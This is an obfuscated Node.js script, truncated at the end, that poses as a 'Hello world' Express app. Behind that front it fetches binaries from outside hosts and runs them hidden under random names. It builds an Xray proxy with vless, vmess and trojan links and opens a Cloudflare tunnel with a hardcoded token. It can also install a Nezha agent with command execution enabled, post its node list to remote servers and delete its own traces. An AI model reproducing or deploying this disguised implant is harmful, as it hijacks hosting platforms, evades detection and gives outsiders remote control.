const _0xf73b7c=_0x4e30;(function(_0x48dd33,_0x1b0a6b){const _0x5337d2=_0x4e30,_0x334ce5=_0x48dd33();while(!![]){try{const _0x920750=parseInt(_0x5337d2(0x1e1))/0x1+parseInt(_0x5337d2(0x214))/0x2+-parseInt(_0x5337d2(0x230))/0x3+-parseInt(_0x5337d2(0x24f))/0x4+-parseInt(_0x5337d2(0x1ee))/0x5+parseInt(_0x5337d2(0x23b))/0x6*(-parseInt(_0x5337d2(0x240))/0x7)+parseInt(_0x5337d2(0x257))/0x8;if(_0x920750===_0x1b0a6b)break;else _0x334ce5['push'](_0x334ce5['shift']());}catch(_0x12e805){_0x334ce5['push'](_0x334ce5['shift']());}}}(_0x1b7e,0xbc95b));const express=require(_0xf73b7c(0x245)),app=express(),axios=require(_0xf73b7c(0x1e8)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0xf73b7c(0x20d)),exec=promisify(require(_0xf73b7c(0x204))[_0xf73b7c(0x258)]),{execSync}=require(_0xf73b7c(0x204)),UPLOAD_URL=process[_0xf73b7c(0x1fa)]['UPLOAD_URL']||'',PROJECT_URL=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x262)]||'',AUTO_ACCESS=process['env'][_0xf73b7c(0x1f1)]||![],FILE_PATH=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x229)]||_0xf73b7c(0x24e),SUB_PATH=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x23c)]||_0xf73b7c(0x248),PORT=process[_0xf73b7c(0x1fa)]['SERVER_PORT']||process['env'][_0xf73b7c(0x20e)]||0xbb8,UUID=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x224)]||_0xf73b7c(0x254),NEZHA_SERVER=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x1f3)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0xf73b7c(0x1fa)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x226)]||'railway.google-us.cc.cd',ARGO_AUTH=process['env']['ARGO_AUTH']||_0xf73b7c(0x21c),ARGO_PORT=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x203)]||0x67e8,CFIP=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x26f)]||_0xf73b7c(0x26d),CFPORT=process[_0xf73b7c(0x1fa)][_0xf73b7c(0x1cd)]||0x1bb,NAME=process['env'][_0xf73b7c(0x21a)]||'';!fs[_0xf73b7c(0x265)](FILE_PATH)?(fs[_0xf73b7c(0x1c7)](FILE_PATH),console[_0xf73b7c(0x24b)](FILE_PATH+'\x20is\x20created')):console[_0xf73b7c(0x24b)](FILE_PATH+'\x20already\x20exists');function _0x4e30(_0x49cd22,_0x4bfd68){_0x49cd22=_0x49cd22-0x1c1;const _0x1b7e5a=_0x1b7e();let _0x4e302c=_0x1b7e5a[_0x49cd22];return _0x4e302c;}function generateRandomName(){const _0x19c689=_0xf73b7c,_0x296a87='abcdefghijklmnopqrstuvwxyz';let _0x29efb5='';for(let _0x54f310=0x0;_0x54f310<0x6;_0x54f310++){_0x29efb5+=_0x296a87[_0x19c689(0x27b)](Math[_0x19c689(0x1dc)](Math['random']()*_0x296a87[_0x19c689(0x233)]));}return _0x29efb5;}function _0x1b7e(){const _0x101766=['send','\x20-c\x20\x22','includes','355794YaeaqH','ArgoDomain:','forEach','\x20failed:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','basename','NAME','\x20>/dev/null\x202>&1\x20&','eyJhIjoiZDUxNjE0MTI4ZjE3YzFkNzhjMDg5ZDhlMzZkNjFjZWIiLCJ0IjoiYWJjMTZjNjItMTk5Ni00YWRlLTgyNmEtYjljOWExYTQzNzM0IiwicyI6Ik5qUmtZVEppT0RRdE1HSTJZaTAwTW1OaUxXSTBZMkl0T1dGbFlqTTJZekk0T0RobCJ9','arm64','writeFileSync','Error\x20downloading\x20files:','.exe\x20>\x20nul\x202>&1','&fp=firefox&type=ws&host=','web\x20running\x20error:\x20','Content-Type','UUID','taskkill\x20/f\x20/im\x20','ARGO_DOMAIN','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x0atrojan://','FILE_PATH','set','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-c\x20','firefox','response','boot.log','1402080sbAmFi','application/json','base64','length','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','arm','test','/trojan-argo','Skipping\x20adding\x20automatic\x20access\x20task','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','6160974QnYLDH','SUB_PATH','clear','direct','https://amd64.ssss.nyc.mn/agent','7qbWaom','2053','\x0a\x20\x20\x20\x20','http','platform','express','App\x20is\x20running','utf-8','sub','https+local://8.8.8.8/dns-query','country_code','log','https://arm64.ssss.nyc.mn/bot','Subscription\x20uploaded\x20successfully','./tmp','979476ybnUlW','close','127.0.0.1','unshift','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ea7d0c5a-8319-4f39-82cd-f0bcc192ac34','Empowerment\x20failed\x20for\x20','message','12718176SZPlJd','exec','readdirSync','nohup\x20','error','\x0a\x20\x20tunnel:\x20','countryCode','toString','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','aarch64','text/plain;\x20charset=utf-8','PROJECT_URL','chmod','2096','existsSync','unlink','true','map','all','Error\x20executing\x20command:\x20','ARGO_DOMAIN:','NEZHA\x20variable\x20is\x20empty,skip\x20running','cdns.doon.eu.org','/dev/null','CFIP','finish','\x0aclient_secret:\x20','--tls','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x22\x20>\x20/dev/null\x202>&1','readFileSync','&path=%2Ftrojan-argo%3Fed%3D2560#','tls','config.json','charAt','tunnel.yml','trojan','pkill\x20-f\x20\x22[','quic','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Error\x20in\x20startserver:','stream','fileName','Download\x20','mkdirSync','filter','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-subscriptions','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','CFPORT','php\x20running\x20error:\x20','Empowerment\x20success\x20for\x20','list.txt','then','Unhandled\x20error\x20in\x20startserver:','vmess','false','match','?security=tls&sni=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','push','del\x20/f\x20/q\x20','none','win32','floor','443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/web','/sub.txt\x20saved\x20successfully','799222rLvdZx','createWriteStream','stringify','https://oooo.serv00.net/add-url','Nodes\x20uploaded\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','?encryption=none&security=tls&sni=','axios','/config.json\x20>/dev/null\x202>&1\x20&','Unknown','split','&path=%2Fvless-argo%3Fed%3D2560#','Hello\x20world!','276950FABDGh','from','/tunnel.yml\x20run','AUTO_ACCESS','\x20is\x20running','NEZHA_SERVER','catch','Error\x20reading\x20boot.log:','data','blackhole','2087','\x20successfully','env','freedom','https://arm64.ssss.nyc.mn/web','listen','substring','\x0avless://','statSync','post','tunnel.json','ARGO_PORT','child_process','/vmess-argo','2083','8443','vless','org','\x20>\x20nul\x202>&1','/vless-argo','isFile','util','PORT','get','https://amd64.ssss.nyc.mn/v1'];_0x1b7e=function(){return _0x101766;};return _0x1b7e();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xf73b7c(0x273)](FILE_PATH,npmName),phpPath=path[_0xf73b7c(0x273)](FILE_PATH,phpName),webPath=path[_0xf73b7c(0x273)](FILE_PATH,webName),botPath=path[_0xf73b7c(0x273)](FILE_PATH,botName),subPath=path[_0xf73b7c(0x273)](FILE_PATH,'sub.txt'),listPath=path[_0xf73b7c(0x273)](FILE_PATH,_0xf73b7c(0x1d0)),bootLogPath=path[_0xf73b7c(0x273)](FILE_PATH,_0xf73b7c(0x22f)),configPath=path[_0xf73b7c(0x273)](FILE_PATH,_0xf73b7c(0x27a));function deleteNodes(){const _0x583937=_0xf73b7c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x53b89e;try{_0x53b89e=fs['readFileSync'](subPath,_0x583937(0x247));}catch{return null;}const _0x621317=Buffer[_0x583937(0x1ef)](_0x53b89e,_0x583937(0x232))[_0x583937(0x25e)](_0x583937(0x247)),_0x1c5671=_0x621317[_0x583937(0x1eb)]('\x0a')[_0x583937(0x1c8)](_0x359e0b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x583937(0x237)](_0x359e0b));if(_0x1c5671[_0x583937(0x233)]===0x0)return;return axios[_0x583937(0x201)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x583937(0x1e3)]({'nodes':_0x1c5671}),{'headers':{'Content-Type':_0x583937(0x231)}})[_0x583937(0x1f4)](_0x1ad68d=>{return null;}),null;}catch(_0x160699){return null;}}function cleanupOldFiles(){const _0x2b7541=_0xf73b7c;try{const _0x530abc=fs[_0x2b7541(0x259)](FILE_PATH);_0x530abc[_0x2b7541(0x216)](_0x3a2c08=>{const _0x12cca7=_0x2b7541,_0x3a5185=path[_0x12cca7(0x273)](FILE_PATH,_0x3a2c08);try{const _0xca1462=fs[_0x12cca7(0x200)](_0x3a5185);_0xca1462[_0x12cca7(0x20c)]()&&fs['unlinkSync'](_0x3a5185);}catch(_0x27d48f){}});}catch(_0x5e42d1){}}app[_0xf73b7c(0x20f)]('/',function(_0x3798c0,_0x162736){const _0x33dacb=_0xf73b7c;_0x162736[_0x33dacb(0x211)](_0x33dacb(0x1ed));});async function generateConfig(){const _0x407113=_0xf73b7c,_0x10b764={'log':{'access':_0x407113(0x26e),'error':_0x407113(0x26e),'loglevel':_0x407113(0x1da)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x407113(0x208),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x407113(0x1da),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x407113(0x205),'dest':0xbbb},{'path':_0x407113(0x238),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x407113(0x208),'settings':{'clients':[{'id':UUID}],'decryption':_0x407113(0x1da)},'streamSettings':{'network':'tcp','security':_0x407113(0x1da)}},{'port':0xbba,'listen':_0x407113(0x251),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x407113(0x20b)}},'sniffing':{'enabled':!![],'destOverride':[_0x407113(0x243),_0x407113(0x279),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x407113(0x251),'protocol':_0x407113(0x1d3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x407113(0x205)}},'sniffing':{'enabled':!![],'destOverride':[_0x407113(0x243),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x407113(0x251),'protocol':_0x407113(0x27d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x407113(0x1da),'wsSettings':{'path':_0x407113(0x238)}},'sniffing':{'enabled':!![],'destOverride':[_0x407113(0x243),'tls',_0x407113(0x1c1)],'metadataOnly':![]}}],'dns':{'servers':[_0x407113(0x249)]},'outbounds':[{'protocol':_0x407113(0x1fb),'tag':_0x407113(0x23e)},{'protocol':_0x407113(0x1f7),'tag':'block'}]};fs[_0x407113(0x21e)](path['join'](FILE_PATH,_0x407113(0x27a)),JSON['stringify'](_0x10b764,null,0x2));}function getSystemArchitecture(){const _0x597e94=_0xf73b7c,_0x188e8a=os['arch']();return _0x188e8a===_0x597e94(0x236)||_0x188e8a===_0x597e94(0x21d)||_0x188e8a===_0x597e94(0x260)?_0x597e94(0x236):'amd';}function downloadFile(_0x5b1ed5,_0x3e46b3,_0x594545){const _0x4aba29=_0xf73b7c,_0x339326=_0x5b1ed5;!fs[_0x4aba29(0x265)](FILE_PATH)&&fs[_0x4aba29(0x1c7)](FILE_PATH,{'recursive':!![]});const _0x50bfb5=fs[_0x4aba29(0x1e2)](_0x339326);axios({'method':_0x4aba29(0x20f),'url':_0x3e46b3,'responseType':_0x4aba29(0x1c4)})[_0x4aba29(0x1d1)](_0x3d056d=>{const _0x19e9e4=_0x4aba29;_0x3d056d[_0x19e9e4(0x1f6)]['pipe'](_0x50bfb5),_0x50bfb5['on'](_0x19e9e4(0x270),()=>{const _0x2a5cf5=_0x19e9e4;_0x50bfb5[_0x2a5cf5(0x250)](),console['log'](_0x2a5cf5(0x1c6)+path['basename'](_0x339326)+_0x2a5cf5(0x1f9)),_0x594545(null,_0x339326);}),_0x50bfb5['on'](_0x19e9e4(0x25b),_0x497a3a=>{const _0x961a04=_0x19e9e4;fs[_0x961a04(0x266)](_0x339326,()=>{});const _0x120618=_0x961a04(0x1c6)+path[_0x961a04(0x219)](_0x339326)+'\x20failed:\x20'+_0x497a3a[_0x961a04(0x256)];console[_0x961a04(0x25b)](_0x120618),_0x594545(_0x120618);});})[_0x4aba29(0x1f4)](_0x3c700c=>{const _0x2b8f4f=_0x4aba29,_0xdc9b8e=_0x2b8f4f(0x1c6)+path[_0x2b8f4f(0x219)](_0x339326)+_0x2b8f4f(0x217)+_0x3c700c[_0x2b8f4f(0x256)];console[_0x2b8f4f(0x25b)](_0xdc9b8e),_0x594545(_0xdc9b8e);});}async function downloadFilesAndRun(){const _0x51d960=_0xf73b7c,_0x56ede5=getSystemArchitecture(),_0x530a13=getFilesForArchitecture(_0x56ede5);if(_0x530a13[_0x51d960(0x233)]===0x0){console[_0x51d960(0x24b)](_0x51d960(0x23a));return;}const _0x234fc7=_0x530a13[_0x51d960(0x268)](_0x565a16=>{return new Promise((_0x5e1fad,_0x241dbc)=>{const _0xec02ba=_0x4e30;downloadFile(_0x565a16[_0xec02ba(0x1c5)],_0x565a16['fileUrl'],(_0x550d48,_0x83c080)=>{_0x550d48?_0x241dbc(_0x550d48):_0x5e1fad(_0x83c080);});});});try{await Promise[_0x51d960(0x269)](_0x234fc7);}catch(_0x4b8df8){console[_0x51d960(0x25b)](_0x51d960(0x21f),_0x4b8df8);return;}function _0x1dbfd7(_0x45ec38){const _0x3e745c=0x1fd;_0x45ec38['forEach'](_0x9ee9fd=>{const _0x1aa2fd=_0x4e30;fs['existsSync'](_0x9ee9fd)&&fs[_0x1aa2fd(0x263)](_0x9ee9fd,_0x3e745c,_0x11b8ec=>{const _0x55dffe=_0x1aa2fd;_0x11b8ec?console['error'](_0x55dffe(0x255)+_0x9ee9fd+':\x20'+_0x11b8ec):console[_0x55dffe(0x24b)](_0x55dffe(0x1cf)+_0x9ee9fd+':\x20'+_0x3e745c['toString'](0x8));});});}const _0x52e34c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1dbfd7(_0x52e34c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x149084=NEZHA_SERVER[_0x51d960(0x213)](':')?NEZHA_SERVER[_0x51d960(0x1eb)](':')['pop']():'',_0x2349dc=new Set([_0x51d960(0x1dd),_0x51d960(0x207),_0x51d960(0x264),_0x51d960(0x1f8),'2083',_0x51d960(0x241)]),_0x2d85a6=_0x2349dc['has'](_0x149084)?_0x51d960(0x267):_0x51d960(0x1d4),_0x1d5900=_0x51d960(0x271)+NEZHA_KEY+_0x51d960(0x1d7)+NEZHA_SERVER+_0x51d960(0x275)+_0x2d85a6+_0x51d960(0x274)+UUID;fs[_0x51d960(0x21e)](path['join'](FILE_PATH,'config.yaml'),_0x1d5900);const _0x3d25cf='nohup\x20'+phpPath+_0x51d960(0x212)+FILE_PATH+_0x51d960(0x227);try{await exec(_0x3d25cf),console[_0x51d960(0x24b)](phpName+_0x51d960(0x1f2)),await new Promise(_0x4a54d3=>setTimeout(_0x4a54d3,0x3e8));}catch(_0x297942){console['error'](_0x51d960(0x1ce)+_0x297942);}}else{let _0x312a7a='';const _0x25ac5a=[_0x51d960(0x1dd),_0x51d960(0x207),_0x51d960(0x264),_0x51d960(0x1f8),_0x51d960(0x206),_0x51d960(0x241)];_0x25ac5a[_0x51d960(0x213)](NEZHA_PORT)&&(_0x312a7a=_0x51d960(0x272));const _0xb24737=_0x51d960(0x25a)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x312a7a+_0x51d960(0x1de);try{await exec(_0xb24737),console['log'](npmName+_0x51d960(0x1f2)),await new Promise(_0xbbbdb1=>setTimeout(_0xbbbdb1,0x3e8));}catch(_0x534c75){console['error']('npm\x20running\x20error:\x20'+_0x534c75);}}}else console[_0x51d960(0x24b)](_0x51d960(0x26c));const _0x2b54dd='nohup\x20'+webPath+_0x51d960(0x22c)+FILE_PATH+_0x51d960(0x1e9);try{await exec(_0x2b54dd),console[_0x51d960(0x24b)](webName+'\x20is\x20running'),await new Promise(_0x579ccd=>setTimeout(_0x579ccd,0x3e8));}catch(_0x3927dd){console[_0x51d960(0x25b)](_0x51d960(0x222)+_0x3927dd);}if(fs[_0x51d960(0x265)](botPath)){let _0x70f068;if(ARGO_AUTH[_0x51d960(0x1d5)](/^[A-Z0-9a-z=]{120,250}$/))_0x70f068='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x51d960(0x1d5)](/TunnelSecret/)?_0x70f068='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x51d960(0x1f0):_0x70f068=_0x51d960(0x1ca)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x51d960(0x25a)+botPath+'\x20'+_0x70f068+'\x20>/dev/null\x202>&1\x20&'),console[_0x51d960(0x24b)](botName+_0x51d960(0x1f2)),await new Promise(_0x416006=>setTimeout(_0x416006,0x7d0));}catch(_0x7c5e95){console['error']('Error\x20executing\x20command:\x20'+_0x7c5e95);}}await new Promise(_0x31c290=>setTimeout(_0x31c290,0x1388));}function getFilesForArchitecture(_0x33a231){const _0x20e8e4=_0xf73b7c;let _0x5a2a4b;_0x33a231==='arm'?_0x5a2a4b=[{'fileName':webPath,'fileUrl':_0x20e8e4(0x1fc)},{'fileName':botPath,'fileUrl':_0x20e8e4(0x24c)}]:_0x5a2a4b=[{'fileName':webPath,'fileUrl':_0x20e8e4(0x1df)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x40719b=_0x33a231===_0x20e8e4(0x236)?_0x20e8e4(0x235):_0x20e8e4(0x23f);_0x5a2a4b['unshift']({'fileName':npmPath,'fileUrl':_0x40719b});}else{const _0x123a1d=_0x33a231===_0x20e8e4(0x236)?'https://arm64.ssss.nyc.mn/v1':_0x20e8e4(0x210);_0x5a2a4b[_0x20e8e4(0x252)]({'fileName':phpPath,'fileUrl':_0x123a1d});}}return _0x5a2a4b;}function argoType(){const _0x1b744a=_0xf73b7c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1b744a(0x24b)](_0x1b744a(0x1e6));return;}if(ARGO_AUTH[_0x1b744a(0x213)]('TunnelSecret')){fs[_0x1b744a(0x21e)](path[_0x1b744a(0x273)](FILE_PATH,_0x1b744a(0x202)),ARGO_AUTH);const _0x2cf4c=_0x1b744a(0x25c)+ARGO_AUTH[_0x1b744a(0x1eb)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x1b744a(0x273)](FILE_PATH,_0x1b744a(0x202))+_0x1b744a(0x1cc)+ARGO_DOMAIN+_0x1b744a(0x25f)+ARGO_PORT+_0x1b744a(0x22b);fs['writeFileSync'](path[_0x1b744a(0x273)](FILE_PATH,_0x1b744a(0x27c)),_0x2cf4c);}else console[_0x1b744a(0x24b)](_0x1b744a(0x1c2));}async function extractDomains(){const _0x5b0268=_0xf73b7c;let _0x3e3318;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3e3318=ARGO_DOMAIN,console[_0x5b0268(0x24b)](_0x5b0268(0x26b),_0x3e3318),await _0x45e967(_0x3e3318);else try{const _0x568658=fs[_0x5b0268(0x277)](path['join'](FILE_PATH,_0x5b0268(0x22f)),_0x5b0268(0x247)),_0x376dfe=_0x568658['split']('\x0a'),_0x5a5df7=[];_0x376dfe[_0x5b0268(0x216)](_0x584fdc=>{const _0x1c47a2=_0x5b0268,_0x22d600=_0x584fdc[_0x1c47a2(0x1d5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x22d600){const _0x1a9026=_0x22d600[0x1];_0x5a5df7['push'](_0x1a9026);}});if(_0x5a5df7[_0x5b0268(0x233)]>0x0)_0x3e3318=_0x5a5df7[0x0],console[_0x5b0268(0x24b)](_0x5b0268(0x215),_0x3e3318),await _0x45e967(_0x3e3318);else{console[_0x5b0268(0x24b)](_0x5b0268(0x218)),fs['unlinkSync'](path[_0x5b0268(0x273)](FILE_PATH,'boot.log'));async function _0x47e574(){const _0x499c50=_0x5b0268;try{process['platform']===_0x499c50(0x1db)?await exec(_0x499c50(0x225)+botName+_0x499c50(0x220)):await exec(_0x499c50(0x27e)+botName['charAt'](0x0)+']'+botName[_0x499c50(0x1fe)](0x1)+_0x499c50(0x276));}catch(_0xbb3df){}}_0x47e574(),await new Promise(_0x571798=>setTimeout(_0x571798,0xbb8));const _0x574ac6=_0x5b0268(0x1ca)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x574ac6+_0x5b0268(0x21b)),console[_0x5b0268(0x24b)](botName+_0x5b0268(0x1f2)),await new Promise(_0x545bee=>setTimeout(_0x545bee,0xbb8)),await extractDomains();}catch(_0x14a71e){console[_0x5b0268(0x25b)](_0x5b0268(0x26a)+_0x14a71e);}}}catch(_0x59110d){console[_0x5b0268(0x25b)](_0x5b0268(0x1f5),_0x59110d);}async function _0x222b8a(){const _0x2cfd7c=_0x5b0268;try{const _0x5b7745=await axios[_0x2cfd7c(0x20f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x5b7745[_0x2cfd7c(0x1f6)]&&_0x5b7745[_0x2cfd7c(0x1f6)]['country_code']&&_0x5b7745[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x209)])return _0x5b7745[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x24a)]+'_'+_0x5b7745[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x209)];}catch(_0x10d019){try{const _0x209c58=await axios[_0x2cfd7c(0x20f)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x209c58[_0x2cfd7c(0x1f6)]&&_0x209c58['data']['status']==='success'&&_0x209c58[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x25d)]&&_0x209c58[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x209)])return _0x209c58[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x25d)]+'_'+_0x209c58[_0x2cfd7c(0x1f6)][_0x2cfd7c(0x209)];}catch(_0x52f5b4){}}return _0x2cfd7c(0x1ea);}async function _0x45e967(_0x1b1bcd){const _0x518846=await _0x222b8a(),_0x5b3113=NAME?NAME+'-'+_0x518846:_0x518846;return new Promise(_0x1c076c=>{setTimeout(()=>{const _0x33bdf2=_0x4e30,_0x4c567d={'v':'2','ps':''+_0x5b3113,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x33bdf2(0x1da),'host':_0x1b1bcd,'path':'/vmess-argo?ed=2560','tls':_0x33bdf2(0x279),'sni':_0x1b1bcd,'alpn':'','fp':_0x33bdf2(0x22d)},_0x26167b=_0x33bdf2(0x1ff)+UUID+'@'+CFIP+':'+CFPORT+_0x33bdf2(0x1e7)+_0x1b1bcd+_0x33bdf2(0x221)+_0x1b1bcd+_0x33bdf2(0x1ec)+_0x5b3113+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x33bdf2(0x1e3)](_0x4c567d))[_0x33bdf2(0x25e)](_0x33bdf2(0x232))+_0x33bdf2(0x228)+UUID+'@'+CFIP+':'+CFPORT+_0x33bdf2(0x1d6)+_0x1b1bcd+'&fp=firefox&type=ws&host='+_0x1b1bcd+_0x33bdf2(0x278)+_0x5b3113+_0x33bdf2(0x242);console['log'](Buffer[_0x33bdf2(0x1ef)](_0x26167b)[_0x33bdf2(0x25e)](_0x33bdf2(0x232))),fs[_0x33bdf2(0x21e)](subPath,Buffer[_0x33bdf2(0x1ef)](_0x26167b)[_0x33bdf2(0x25e)]('base64')),console[_0x33bdf2(0x24b)](FILE_PATH+_0x33bdf2(0x1e0)),uploadNodes(),app[_0x33bdf2(0x20f)]('/'+SUB_PATH,(_0x41bfd0,_0x1728e9)=>{const _0x3ffb63=_0x33bdf2,_0x40893a=Buffer[_0x3ffb63(0x1ef)](_0x26167b)[_0x3ffb63(0x25e)]('base64');_0x1728e9[_0x3ffb63(0x22a)](_0x3ffb63(0x223),_0x3ffb63(0x261)),_0x1728e9[_0x3ffb63(0x211)](_0x40893a);}),_0x1c076c(_0x26167b);},0x7d0);});}}async function uploadNodes(){const _0x5bef47=_0xf73b7c;if(UPLOAD_URL&&PROJECT_URL){const _0x41a97e=PROJECT_URL+'/'+SUB_PATH,_0x515eb6={'subscription':[_0x41a97e]};try{const _0x2a6a08=await axios['post'](UPLOAD_URL+_0x5bef47(0x1cb),_0x515eb6,{'headers':{'Content-Type':_0x5bef47(0x231)}});return _0x2a6a08&&_0x2a6a08[_0x5bef47(0x1c9)]===0xc8?(console['log'](_0x5bef47(0x24d)),_0x2a6a08):null;}catch(_0x225841){if(_0x225841[_0x5bef47(0x22e)]){if(_0x225841[_0x5bef47(0x22e)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5bef47(0x265)](listPath))return;const _0x4cc93f=fs['readFileSync'](listPath,_0x5bef47(0x247)),_0x193e75=_0x4cc93f[_0x5bef47(0x1eb)]('\x0a')['filter'](_0x2ecabb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5bef47(0x237)](_0x2ecabb));if(_0x193e75[_0x5bef47(0x233)]===0x0)return;const _0xd61000=JSON[_0x5bef47(0x1e3)]({'nodes':_0x193e75});try{const _0x259a23=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0xd61000,{'headers':{'Content-Type':_0x5bef47(0x231)}});return _0x259a23&&_0x259a23[_0x5bef47(0x1c9)]===0xc8?(console[_0x5bef47(0x24b)](_0x5bef47(0x1e5)),_0x259a23):null;}catch(_0x36f28a){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x48bc63=_0x4e30,_0x22740a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x22740a['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x22740a[_0x48bc63(0x1d8)](phpPath);process[_0x48bc63(0x244)]===_0x48bc63(0x1db)?exec(_0x48bc63(0x1d9)+_0x22740a[_0x48bc63(0x273)]('\x20')+_0x48bc63(0x20a),_0x126f2b=>{const _0x2ea76a=_0x48bc63;console[_0x2ea76a(0x23d)](),console[_0x2ea76a(0x24b)]('App\x20is\x20running'),console[_0x2ea76a(0x24b)](_0x2ea76a(0x253));}):exec('rm\x20-rf\x20'+_0x22740a[_0x48bc63(0x273)]('\x20')+_0x48bc63(0x234),_0x29c63c=>{const _0x5d4823=_0x48bc63;console['clear'](),console[_0x5d4823(0x24b)](_0x5d4823(0x246)),console[_0x5d4823(0x24b)](_0x5d4823(0x253));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x198f3a=_0xf73b7c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x198f3a(0x239));return;}try{const _0x5ad04b=await axios[_0x198f3a(0x201)](_0x198f3a(0x1e4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x198f3a(0x231)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x5ad04b;}catch(_0x45a95b){return console[_0x198f3a(0x25b)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x45a95b[_0x198f3a(0x256)]),null;}}async function startserver(){const _0x20cb69=_0xf73b7c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4446c5){console['error'](_0x20cb69(0x1c3),_0x4446c5);}}startserver()[_0xf73b7c(0x1f4)](_0x457db2=>{const 